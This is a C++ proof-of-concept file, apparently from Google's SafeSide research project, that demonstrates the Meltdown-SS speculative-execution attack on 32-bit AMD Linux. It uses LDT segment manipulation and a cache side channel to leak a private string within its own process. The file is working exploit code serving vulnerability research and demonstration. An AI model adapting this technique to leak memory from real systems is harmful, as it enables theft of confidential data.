/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates the Meltdown-SS. Speculative fetching of data from non-present
 * segments and violating segment limits at the same time. Since segment limits
 * are enforced only in 32-bit mode, this example does not work on x86_64.
 * We initialize two segments - one points to public data, one points to
 * private data. Then we use two segment pointers (FS and ES) and point them to
 * those segments. Afterwards we make the segment pointing to private data
 * non-present and limit its size to one character (which is dummy in the
 * private data). Finally we speculatively read from the non-present segment
 * beyond its size limits capturing the architectural failures with a SIGSEGV
 * handler.
 *
 * Intel does not seem to be vulnerable to Meltdown-SS. Works only on AMD CPUs.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. 32-bit AMD required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <asm/ldt.h>
#include <signal.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

// Sets up a segment descriptor in the local descriptor table.
static void SetupSegment(int index, const char *base, bool present) {
  // See: Intel SDM volume 3a "3.4.5 Segment Descriptors".
  struct user_desc table_entry;
  memset(&table_entry, 0, sizeof(struct user_desc));
  table_entry.entry_number = index;
  // We must shift the base address one byte below to bypass the minimal segment
  // size which is one byte.
  table_entry.base_addr = reinterpret_cast<unsigned int>(base - 1);
  // No size limit for a present segment, one byte for a non-present segment.
  // Limit is the offset of the last accessible byte, so even a value of zero
  // creates a one-byte segment.
  table_entry.limit = present ? 0xFFFFFFFF : 0;
  // No 16-bit segment.
  table_entry.seg_32bit = 1;
  // No direction or conforming bits.
  table_entry.contents = 0;
  // Writeable segment.
  table_entry.read_exec_only = 0;
  // Limit is in bytes, not in pages.
  table_entry.limit_in_pages = 0;
  // True iff present is false.
  table_entry.seg_not_present = !present;
  int result = syscall(__NR_modify_ldt, 1, &table_entry,
                       sizeof(struct user_desc));
  if (result != 0) {
    std::cerr << "Segmentation setup failed." << std::endl;
    exit(EXIT_FAILURE);
  }
}

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // First we have to setup the private segment as present, because otherwise
    // the write to ES would fail with SIGBUS on some Intel CPUs. We use index
    // 1 because index 0 is occupied by the public data segment.
    SetupSegment(1, private_data, true);

    // Assigning FS to the segment that points to public data and ES to the
    // segment that points to private data.

    // PL = 3, local_table = 1 * 4, index = 0 * 8.
    int fs_backup = ExchangeFS(3 + 4);
    // PL = 3, local_table = 1 * 4, index = 1 * 8.
    int es_backup = ExchangeES(3 + 4 + 8);

    // Making the segment that points to private data non present - that means
    // that each access to it architecturally fails. Just rewriting the
    // descriptor on index 1 with a non-present one.
    SetupSegment(1, private_data, false);

    // Block all speculation and memory forwarding with CPUID. Otherwise we
    // would get false positives on many Intel CPUs that allow speculation on
    // ES and FS values.
    MemoryAndSpeculationBarrier();

    // Successful execution accesses safe_offset in the public data.
    ForceRead(oracle.data() +
              static_cast<size_t>(ReadUsingFS(safe_offset)));

    // Accessing the private data architecturally fails with SIGSEGV.
    ForceRead(oracle.data() +
              static_cast<size_t>(ReadUsingES(offset)));

    // Unreachable code.
    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGSEGV signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    // We must restore the segments - especially ES - because they are used in
    // the C++ STL (e.g. ia32_strcpy function).
    ExchangeFS(fs_backup);
    ExchangeES(es_backup);

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  OnSignalMoveRipToAfterspeculation(SIGSEGV);
  // Setup the public data segment descriptor on index 0. It is always present.
  SetupSegment(0, public_data, true);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
